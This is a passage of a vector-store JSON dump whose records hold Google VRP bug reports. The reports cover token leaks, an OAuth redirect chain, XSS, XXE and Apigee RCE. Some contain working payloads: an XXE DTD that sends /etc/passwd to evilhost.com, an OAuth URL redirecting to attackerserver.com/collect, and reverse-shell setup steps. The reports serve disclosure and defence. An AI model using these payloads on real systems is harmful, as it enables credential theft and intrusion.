"2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "2b655e01-c3c1-4012-bb8e-22360990e6b0", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_354319.txt", "file_name": "20250408_175654_354319.txt", "file_type": "text/plain", "file_size": 1562, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "01778a1eed3624d6c386d3e35de32d03fabb02c7fdc259ba596d851f7e01bd6b", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\naccess_token leak on https://edit.chromium.org/\r\nReported by:\r\nNDevTK\r\nGoogle VRP\r\ntriaged\r\n11:31 | May 8, 2023\r\nclosed\r\n03:38 | May 11, 2023\r\ntriaged\r\n16:14 | May 11, 2023\r\naccepted\r\n06:54 | May 18, 2023\r\ntriaged\r\n14:44 | May 18, 2023\r\naccepted\r\n08:35 | May 26, 2023\r\nfixed\r\n04:54 | Aug 31, 2023\r\nreward decided\r\n$7,500\r\nSummary:\r\naccess_token leak on\r\nhttps://edit.chromium.org/\r\nProduct:\r\nGoogle\r\nURL:\r\nhttps://edit.chromium.org/edit?file=https%3A%2F%2Fandroid.googlesource.com%2Fexample.com%23.googlesource.com%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2Fheads%2Fmaster%2FChanges.md%27\r\nVulnerability type:\r\nSensitive data exposure\r\nDetails\r\nWhen signed in to the Git Source Editor and going to the URL it sends your OAuth token to\r\nhttps://example.com/?access_token=<TOKEN>\r\nNormally URLs would be restricted to\r\n*.googlesource.com\r\nor\r\n*.git.corp.google.com\r\nThis app seems to be owned by the Android Build Team\r\nhttp://android-build.corp.google.com/\r\nAttack scenario\r\nGoing to an attacker controlled URL leaks a token which looks to be the OAuth token for the trusted google app used for making changes to chromium and android.\r\nThe scope looks to be:\r\n\"email profile\r\nhttps://www.googleapis.com/auth/userinfo.profile\r\nopenid\r\nhttps://www.googleapis.com/auth/gerritcodereview\r\nhttps://www.googleapis.com/auth/androidbuild.internal\r\nhttps://www.googleapis.com/auth/userinfo.email\"\r\nmaybe after loading the resource it could be \"escalated\" to XSS but that be a bit pointless.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1546, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "c3f473a7-5d50-401d-984e-f43afd698468": {"__data__": {"id_": "c3f473a7-5d50-401d-984e-f43afd698468", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_385791.txt", "file_name": "20250408_175654_385791.txt", "file_type": "text/plain", "file_size": 3617, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "c85d4846-af91-4d6e-a70f-36e1502f6a33", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_385791.txt", "file_name": "20250408_175654_385791.txt", "file_type": "text/plain", "file_size": 3617, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "3b03b21c0e5b9dfc10d194c3d17c27bc7630063548b48022f02341f6d7a221a5", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nCloud Tools for Eclipse - Chaining misconfigured OAuth callback redirection with open redirect vulnerability to leak Google OAuth Tokens with full GCP Permissions\r\nReported by:\r\nMo Sakr\r\nGoogle VRP\r\ntriaged\r\n06:55 | Apr 25, 2023\r\nclosed\r\n06:23 | Apr 26, 2023\r\ntriaged\r\n15:04 | Apr 26, 2023\r\naccepted\r\n12:25 | Apr 27, 2023\r\nfixed\r\n22:23 | Jun 17, 2023\r\nreward decided\r\n$500\r\nSummary:\r\nCloud Tools for Eclipse - Chaining misconfigured OAuth callback redirection with open redirect vulnerability to leak Google OAuth Tokens with full GCP Permissions\r\nProduct:\r\nGoogle Cloud\r\nURL:\r\nhttps://accounts.google.com/o/oauth2/auth/oauthchooseaccount?client_id=572124029240-i0vhlk5ibeqbufl5e56ttdbs20ucj2k1.apps.googleusercontent.com&redirect_uri=http://localhost:8080/_ah/login?continue=http://attackerserver.com/collect&response_type=code&scope=email%20https://www.googleapis.com/auth/cloud-platform&service=lso&o2v=1&flowName=GeneralOAuthFlow\r\nVulnerability type:\r\nSensitive data exposure\r\nDetails\r\nThe \"Google Cloud Tools for Eclipse plugin\" uses a Google OAuth login flow to get authorized to access a user's GCP account. By chaining an insecure redirect/callback URL configuration with an open redirect vulnerability in the local appengine development server that the plugin creates, an attacker can abuse the user's trust in the plugin to steal their OAuth tokens.\r\nThe attack conditions are as follows:\r\nThe user has installed the Cloud Tools for Eclipse plugin as described\r\nhere\r\nThe user has created a starter appengine project in Eclipse following steps\r\nhere\r\nThe user has run the project as appengine as described\r\nhere\r\nThe attack steps are as follows:\r\nThreat actor provides user with a Google OAuth authorization URL that has the trusted \"Cloud Tools for Eclipse\" branding and \"\r\ncloud-java-team@google.com\r\n\" developer info.  The URL has a maliciously crafted \"redierct_uri\" parameter value as follows:\r\nhttps://accounts.google.com/o/oauth2/auth/oauthchooseaccount?client_id=572124029240-i0vhlk5ibeqbufl5e56ttdbs20ucj2k1.apps.googleusercontent.com&redirect_uri=http://localhost:8080/_ah/login?continue=http://attackerserver.com/collect&response_type=code&scope=email%20https://www.googleapis.com/auth/cloud-platform&service=lso&o2v=1&flowName=GeneralOAuthFlow\r\nUser is presented with the \"Cloud Tools for Eclipse wants to access your Google Account\" page and grants the access.\r\nHost at\r\naccounts.google.com\r\nresponds with a redirect to the following location:\r\nhttp://localhost:8080/_ah/login?continue=http://attackerserver.com/collect&code=REDACTED&scope=email%20https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/cloud-platform%20openid&authuser=2&prompt=consent\r\nThis redirected location (screenshot attached) is the sign-on page of the\r\nbuilt-in Users Service from the local appengine development server\r\nOnce user clicks on either of the \"Log out\" or \"Log in\" buttons, they are redirected to\r\nhttp://attackerserver.com/collect\r\nand the request contains a referrer header of the localhost:8080 origin containing the OAuth authorization code.\r\nAttack scenario\r\nAs previously described, the attack can be performed by an external threat actor. The attack requires some user interaction but success is reasonably high if done via a social engineering campaign.\r\nIf successful, a threat actor is able to exfiltrate the victim's Google Authorization code which they can easily exchange for access and refresh tokens with permissions to perform all API actions against the victim's GCP account.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3601, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "87a87626-408a-4e96-81af-42b5785479d4": {"__data__": {"id_": "87a87626-408a-4e96-81af-42b5785479d4", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_491339.txt", "file_name": "20250408_175656_491339.txt", "file_type": "text/plain", "file_size": 1740, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "4487435c-303a-49c8-9439-b97285067e8e", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_491339.txt", "file_name": "20250408_175656_491339.txt", "file_type": "text/plain", "file_size": 1740, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "7bb4495e2164bd6febe2a3798eb75ccde3179473182d3e6d3d3191d67f35e93e", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nStored XSS on https://identity-dev.api.verily.com/\r\nReported by:\r\nvijay kumar\r\nGoogle VRP\r\naccepted\r\n17:38 | Apr 20, 2023\r\nfixed\r\n14:10 | Apr 30, 2023\r\nreward decided\r\n$100\r\nSummary:\r\nStored XSS on\r\nhttps://identity-dev.api.verily.com/\r\nProduct:\r\nverily.com\r\nURL:\r\nhttps://identity-dev.api.verily.com\r\nVulnerability type:\r\nCross-site scripting (XSS)\r\nDetails\r\nWhile testing verily.com subdomains i came across domain\r\nhttps://identity-dev.api.verily.com/\r\nwhich is used for authentication and identity verification. I found Stored XSS on this domain.\r\nI have found this stored XSS in 2 different domains .\r\nDescription :\r\nWhen you go to\r\nhttps://ciam-email-verification.api.verily.com\r\nand authenticate yourself , you will see option of \"Unverify your email\" . When you click on it , It will send a request in background which looks like below.\r\nhttps://identity-dev.api.verily.com/UnverifyEmail?id=ciam%3Av1%3Aauth0%7C643daac39c44a90a5eefbe48&return=%2F\r\nHere \"return\" post parameter is vulnerable to XSS Attack.\r\nPayload used :\r\njavascript:alert(document.domain)\r\nVulnerable Domains :\r\nhttps://identity-dev.api.verily.com\r\nhttps://identity-playground.api.verily.com\r\nFinal Stored XSS POC :\r\nhttps://identity-dev.api.verily.com/UnverifyEmail?id=ciam%3Av1%3Aauth0%7C643daac39c44a90a5eefbe48&return=javascript:alert(document.domain)\r\nSame works on domain\r\nhttps://identity-playground.api.verily.com\r\ntoo.\r\nhttps://identity-playground.api.verily.com/UnverifyEmail?id=ciam%3av1%3aauth0%7c642521a63d40e99271e1c97d&return=javascript:alert(document.domain)\r\nBoth the XSS works on both Authenticated and Unauthenticated Accounts.\r\nAttack scenario\r\nStored XSS.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1724, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "b5b0a15c-d961-4cd7-bd66-7d7640cd0865": {"__data__": {"id_": "b5b0a15c-d961-4cd7-bd66-7d7640cd0865", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_523326.txt", "file_name": "20250408_175656_523326.txt", "file_type": "text/plain", "file_size": 2510, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "895bab1a-3c52-4817-8561-0fcf869882aa", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_523326.txt", "file_name": "20250408_175656_523326.txt", "file_type": "text/plain", "file_size": 2510, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "887f61973cc220bd3d7ab536bff8f8a75c66cc4c97a13084770fa4b18cb538f3", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nXXE vulnerability in the \"Cloud Tools for Eclipse\" IDE Plugin\r\nReported by:\r\nMo Sakr\r\nGoogle VRP\r\ntriaged\r\n18:02 | Apr 17, 2023\r\naccepted\r\n19:30 | Apr 18, 2023\r\nfixed\r\n19:18 | Jun 18, 2023\r\nreward decided\r\n$500\r\nSummary:\r\nXXE vulnerability in the \"Cloud Tools for Eclipse\" IDE Plugin\r\nProduct:\r\nGoogle Cloud\r\nURL:\r\nhttps://github.com/GoogleCloudPlatform/google-cloud-eclipse/\r\nVulnerability type:\r\nXML eXternal Entity (XXE)\r\nDetails\r\nThe plugin is vulnerable to XXE via insecure parsing of the appengine-web.xml file. The vulnerability can be demonstrated as follows:\r\nIn Eclipse, install the Cloud Tools Plugin as described\r\nhere\r\nCreate a starter appengine project in Eclipse following steps\r\nhere\r\nCreate and host a DTD file \"evil.dtd\" with the following content (change the URL to one you control) :\r\n<!ENTITY % all \"<!ENTITY send SYSTEM 'http://evilhost.com/?collect=%file;'>\r\n  \"> %all;\r\nOpen the project's appengine-web.xml file and replace the content with the following (replace the URL with the one you're using to host evil.dtd above):\r\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n  <!DOCTYPE data [ <!ENTITY % file \"file:///etc/passwd\"> <!ENTITY % dtd SYSTEM \"http://evilhost.com/evil.dtd\">%dtd; ]>\r\n  <appengine-web-app xmlns=\"http://appengine.google.com/ns/1.0\">\r\n    <threadsafe>true</threadsafe>\r\n    <sessions-enabled>false</sessions-enabled>\r\n    <runtime>java8</runtime>\r\n    <system-properties>\r\n      <property name=\"java.util.logging.config.file\" value=\"WEB-INF/logging.properties\"/>\r\n    </system-properties>\r\n  </appengine-web-app>\r\nDepending on the permissions granted to the Eclipse user, the contents of the /etc/passwd file will be transmitted to the remote server.\r\nThe vulnerable code can be found in the following snippets:\r\nhttps://github.com/GoogleCloudPlatform/google-cloud-eclipse/blob/4d213f59421f7d28aab17e336a248713fc97f1fa/plugins/com.google.cloud.tools.eclipse.appengine.standard.java8/src/com/google/cloud/tools/eclipse/appengine/standard/java8/AppEngineStandardJre8ProjectFacetDetector.java#L69-L77\r\nAttack scenario\r\nAn attacker would create an appengine project with a maliciously crafted appengine-web.xml file and host it on a public repository. An unsuspecting user would open the project in Eclipse and upon opening the appengine-web.xml file would trigger the attack that would harvest sensitive local files from the user's machine and exfiltrate them to the attacker's servers.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2494, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "ff6f390f-3943-40e0-bd72-6444d67f823a": {"__data__": {"id_": "ff6f390f-3943-40e0-bd72-6444d67f823a", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_554567.txt", "file_name": "20250408_175656_554567.txt", "file_type": "text/plain", "file_size": 5465, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "be9c74f3-8935-4ea4-95d2-828c0b360eb5", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_554567.txt", "file_name": "20250408_175656_554567.txt", "file_type": "text/plain", "file_size": 5465, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "fe9163df8de72e7abf5272b9ef4110e98e292df597fcb36f95f3ba8d8240ea93", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "7d85d6f5-8d03-412f-981a-1e628391d9f4", "node_type": "1", "metadata": {}, "hash": "590c638734cf5c908f597006c1ecb0da2205057493feea7bfbc916a055011f01", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nGoogle OAuth2 Login CSRF Vulnerability in Google Cloud Eclipse IDE Plugin\r\nReported by:\r\nMo Sakr\r\nGoogle VRP\r\ntriaged\r\n17:46 | Apr 17, 2023\r\naccepted\r\n18:25 | Apr 18, 2023\r\nfixed\r\n15:24 | Jun 17, 2023\r\nreward decided\r\n$101\r\nSummary:\r\nGoogle OAuth2 Login CSRF Vulnerability in Google Cloud Eclipse IDE Plugin\r\nProduct:\r\nGoogle Cloud\r\nURL:\r\nhttps://github.com/GoogleCloudPlatform/google-cloud-eclipse/blob/4d213f59421f7d28aab17e336a248713fc97f1fa/plugins/com.google.cloud.tools.eclipse.login/src/com/google/cloud/tools/eclipse/login/GoogleLoginService.java#L64\r\nVulnerability type:\r\nCross-site request forgery (CSRF)\r\nDetails\r\nThe official \"Google Cloud Tools for Eclipse\" IDE plugin, referenced\r\nhere\r\n,  is vulnerable to a Google OAuth2 Login CSRF attack. As part of the plugin setup process, users are prompted to follow a Google OAuth2 flow to authorize the plugin to access the user's email and perform actions on their Google Cloud account.\r\nWhen the user initiates the authorization flow, they are redirected to a browser page similar to this:\r\nhttps://accounts.google.com/o/oauth2/auth?client_id=572124029240-i0vhlk5ibeqbufl5e56ttdbs20ucj2k1.apps.googleusercontent.com&redirect_uri=http://localhost:49790/Callback&response_type=code&scope=email%20https://www.googleapis.com/auth/cloud-platform\r\nNote that the URL above does not include the \"state\" parameter which is used to prevent CSRF attacks as described\r\nhere\r\n.\r\nThe plugin exposes this vulnerability in its insecure use of the \"GoogleAuthorizationCodeRequestUrl\" method in the\r\nGoogleLoginService.java\r\nclass:\r\npublic static String\r\ngetGoogleLoginUrl\r\n(String redirectUrl) {\r\n    return new\r\nGoogleAuthorizationCodeRequestUrl\r\n(Constants.getOAuthClientId(), redirectUrl,\r\n        OAUTH_SCOPES).toString();\r\n  }\r\nAnother aspect of this implementation that makes it more easily exploitable is the fact that the plugin creates a local HTTP server that listens on all network interfaces. This is the server that receives the callback with the authorization code after the user connects their user accounts (redirect_uri from the URL above).\r\nThe vulnerable creation of the HTTP server comes from the use of the getRedirectUri() method in\r\nLocalServerReceiver.java\r\nclass:\r\npublic String\r\ngetRedirectUri\r\n() throws IOException {\r\n    server =\r\nHttpServer.create(new InetSocketAddress(port != -1 ? port : findOpenPort()), 0);\r\nHttpContext context = server.createContext(callbackPath, new CallbackHandler());\r\n    server.setExecutor(null);\r\n    try {\r\n      server.start();\r\n      port = server.getAddress().getPort();\r\n    } catch (Exception e) {\r\n      Throwables.propagateIfPossible(e);\r\n      throw new IOException(e);\r\n    }\r\n    return \"http://\" + this.getHost() + \":\" + port + callbackPath;\r\n  }\r\nWhere the getRedirectUri method and  getGoogleLoginUrl get directly invoked in\r\nLoginServiceUi.java\r\nas follows:\r\npublic VerificationCodeHolder\r\nobtainVerificationCodeFromExternalUserInteraction\r\n(String message) {\r\n    LocalServerReceiver\r\ncodeReceiver = createLocalServerReceiver\r\n();\r\n    try {\r\n      String\r\nredirectUrl = codeReceiver.getRedirectUri\r\n();\r\n      if (!Program.launch(GoogleLoginService.\r\ngetGoogleLoginUrl\r\n(redirectUrl))) {\r\n        showErrorDialogHelper(\r\n            Messages.getString(\"LOGIN_ERROR_DIALOG_TITLE\"),\r\n            Messages.getString(\"LOGIN_ERROR_CANNOT_OPEN_BROWSER\"));\r\n        return null;\r\n      }\r\n      String authorizationCode = showProgressDialogAndWaitForCode(codeReceiver);\r\n      if (authorizationCode != null) {\r\n        AnalyticsPingManager.getInstance().sendPingOnShell(shellProvider.getShell(),\r\n            AnalyticsEvents.LOGIN_SUCCESS);\r\n        return new VerificationCodeHolder(authorizationCode, redirectUrl);\r\n      }\r\n      return null;\r\nFrom\r\nLoginServiceUi.java\r\nThe attack scenario is as follows:\r\nA would-be attacker, with a target user in mind, would create a Google account resembling that of the user (same profile pic, similar email spelling...).\r\nThe attacker would create a program that would either directly call the IP of the targeted user (if they are in the same LAN as the plugin user or the user's machine is exposed to the internet) or they would craft an HTML page that the user would unsuspectingly browse to.\r\nTo identify the port that the server is listening on, the attacker would perform a port scan against the machine which can be performed either remotely or via JavaScript in the HTML page in the browser.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 4503, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "7d85d6f5-8d03-412f-981a-1e628391d9f4": {"__data__": {"id_": "7d85d6f5-8d03-412f-981a-1e628391d9f4", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_554567.txt", "file_name": "20250408_175656_554567.txt", "file_type": "text/plain", "file_size": 5465, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "be9c74f3-8935-4ea4-95d2-828c0b360eb5", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_554567.txt", "file_name": "20250408_175656_554567.txt", "file_type": "text/plain", "file_size": 5465, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "fe9163df8de72e7abf5272b9ef4110e98e292df597fcb36f95f3ba8d8240ea93", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "ff6f390f-3943-40e0-bd72-6444d67f823a", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_554567.txt", "file_name": "20250408_175656_554567.txt", "file_type": "text/plain", "file_size": 5465, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "5354a71462246eb2f31e2595bc36be8e6920da5b58afb68bfcae0961d56bdef3", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "The attacker would create a program that would either directly call the IP of the targeted user (if they are in the same LAN as the plugin user or the user's machine is exposed to the internet) or they would craft an HTML page that the user would unsuspectingly browse to.\r\nTo identify the port that the server is listening on, the attacker would perform a port scan against the machine which can be performed either remotely or via JavaScript in the HTML page in the browser.\r\nOnce the callback URL is fully identified, the attacker would make a request to it with the authorization code belonging to the counterfeit account they created.\r\nThe user's IDE would be logged in as the counterfeit account and would perform actions against that account\r\nAttack scenario\r\nA would-be attacker situated on the internet or in the same LAN as the targeted victim would be able to call the callback endpoint with their own authorization code (redirect_uri above). With a targeted attack, the attacker would create a Google account that is almost indistinguishable from the victim's (same profile pic, similar email address spelling...).\r\nAn unsuspecting user would then use the plugin as intended and the consequence would be that they would deploy their apps to the account under the attacker's control. This would lead to the leak of confidential source code, and other sensitive secrets deployed with the app.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 4027, "end_char_idx": 5449, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "4371f9be-066c-42f1-b3e6-325e120ae83f": {"__data__": {"id_": "4371f9be-066c-42f1-b3e6-325e120ae83f", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_601802.txt", "file_name": "20250408_175656_601802.txt", "file_type": "text/plain", "file_size": 3983, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "a51f5a34-816a-4051-8e10-150bd3f01e7b", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_601802.txt", "file_name": "20250408_175656_601802.txt", "file_type": "text/plain", "file_size": 3983, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "d4fbd186617a8947932dc6b80d6460544db35f471b1515899aa63fd0830731a5", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nRemote Code Execution vulnerability in LookupCache policy in Google Apigee allows attacker to execute arbitrary Java code by specially crafted cache entry\r\nGoogle VRP\r\ntriaged\r\n02:41 | Mar 16, 2023\r\naccepted\r\n22:10 | Mar 16, 2023\r\nfixed\r\n17:17 | Aug 21, 2023\r\nreward decided\r\n$1,337\r\nSummary:\r\nRemote Code Execution vulnerability in LookupCache policy in Google Apigee allows attacker to execute arbitrary Java code by specially crafted cache entry\r\nProduct:\r\nApigee\r\nVulnerability type:\r\nRemote Code Execution (RCE)\r\nDetails\r\nHi Google Security team,\r\nUsing policies for general purpose caching, you can persist any objects your proxy requires across multiple request/response sessions\r\nI noticed that when Apigee retrieves cache entry, it also invokes postDeserialize() method on the retrieved entry value, if entry value is an object of com.apigee.util.PostDeserializer class. Moreover, execution of this method is not sandboxed with Java Permissions, which opens a possibility to run arbitrary code.\r\nAttack scenario\r\nThe vulnerability can be exploited by a remote attacker.\r\nThe attacker can execute arbitrary Java code. The attacker can bind a reverse shell.\r\nIn short, to exploit this you need to:\r\nCraft special object, which must be an implementation of com.apigee.util.PostDeserializer class. This object must contain postDeserialize() method with arbitrary Java code.\r\nPut this object into some message context variable.\r\nPut message context variable into the cache via PopulateCache policy.\r\nRetrieve the object via LookupCache policy.\r\nI have created PoC proxy for you as well as Java project.\r\nSteps to Reproduce\r\nSetup reverse shell listener on your publicly available server with the following command:\r\nnc -lvnp 8899\r\nDownload PoC proxy from the attachments (java-and-cache-rce_rev3_2023_03_15.zip).\r\nCreate a proxy in the Apigee UI and upload PoC proxy bundle into it.\r\nDownload Java project from the attachments (demo.zip).\r\nUnzip and open Java project in your favorite IDE (you need Java 11/OpenJdk 11).\r\nOpen src/main/java/com/apigeesamplerce/App.java.\r\nOn the line 18 change IP 35.205.178.244 to the IP address of your publicly available server. You can also change a port if you want. Save the file.\r\nBuild Java project with the following commands:\r\nmvn install:install-file \\\r\n  -Dfile=expressions-1.0.0.jar \\\r\n  -DgroupId=com.apigee.edge \\\r\n  -DartifactId=expressions \\\r\n  -Dversion=1.0.0 \\\r\n  -Dpackaging=jar \\\r\n  -DgeneratePom=true\r\n\r\n mvn install:install-file \\\r\n  -Dfile=message-flow-1.0.0.jar \\\r\n  -DgroupId=com.apigee.edge \\\r\n  -DartifactId=message-flow \\\r\n  -Dversion=1.0.0 \\\r\n  -Dpackaging=jar \\\r\n  -DgeneratePom=true\r\n\r\n mvn install:install-file \\\r\n  -Dfile=util-1.0.0.jar \\\r\n  -DgroupId=com.apigee.edge \\\r\n  -DartifactId=util \\\r\n  -Dversion=1.0.0 \\\r\n  -Dpackaging=jar \\\r\n  -DgeneratePom=true\r\n\r\nmvn clean package\r\nAfter successful building locate demo-1.0-SNAPSHOT.jar under target directory in the Java project.\r\nUpload demo-1.0-SNAPSHOT.jar into your proxy via Apigee UI. You can do it by clicking on Add Resource button (\u2795) on Resources directory on the left side of Develop Tab of the Apigee UI - choose JAR resource type, choose demo-1.0-SNAPSHOT.jar as file and click Add.\r\nSave revision and deploy your proxy.\r\nReplace DOMAIN in the following command with domain name of the Apigee instance. Trigger reverse shell by sending get request to your proxy.\r\ncurl https://DOMAIN/java-and-cache-rce/rce\r\nObserve reverse shell connection\r\nPoC explanation\r\nPoC proxy contains 3 policies:\r\nJAVA-1 - JavaCallout policy which creates malicious object with reverse shell payload and stores this object in\r\ncache_str\r\ncontext variable.\r\nPC-1 - PopulateCache policy, which takes malicious object from\r\ncache_str\r\ncontext variable and puts it into a cache\r\nLC-1 - LookupCache policy, which retrieves the object from the cache and executes its postDeserialize() method\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3965, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "4c6a70de-e167-4836-a53e-02db41a8c6cb": {"__data__": {"id_": "4c6a70de-e167-4836-a53e-02db41a8c6cb", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_633215.txt", "file_name": "20250408_175656_633215.txt", "file_type": "text/plain", "file_size": 1553, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "36a35c90-fdda-4d19-a246-184ea7945dad", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_633215.txt", "file_name": "20250408_175656_633215.txt", "file_type": "text/plain", "file_size": 1553, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "58e740ae8b45ed31b797f835faf4cffa648338a48f14d9550deeb5bf07562c96", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press 